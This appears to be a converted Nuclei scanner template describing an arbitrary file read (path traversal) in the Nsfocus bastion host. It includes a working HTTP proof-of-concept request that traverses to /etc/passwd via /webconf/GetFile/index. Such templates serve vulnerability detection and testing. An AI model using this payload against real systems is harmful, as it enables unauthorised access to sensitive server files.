# Nuclei Template: Nsfocus - Arbitrary File Read
**Template ID:** nsfocus-lfi
**Vulnerability Class:** Path Traversal
**Severity:** High
**Source:** Nuclei Template (`nsfocus-lfi.yaml`)

## Vulnerability Information & PoC

## Description
Nsfocus bastion has an Arbitrary File Read Vulnerability through '/webconf/GetFile/'.

## Steps to reproduce / Exploit Payload
```http
GET /user/requireLogin HTTP/1.1
Host: {{Hostname}}

GET /webconf/GetFile/index?path=../../../../../../../../../../../../../../etc/passwd HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
```

## References
- https://forum.butian.net/article/250
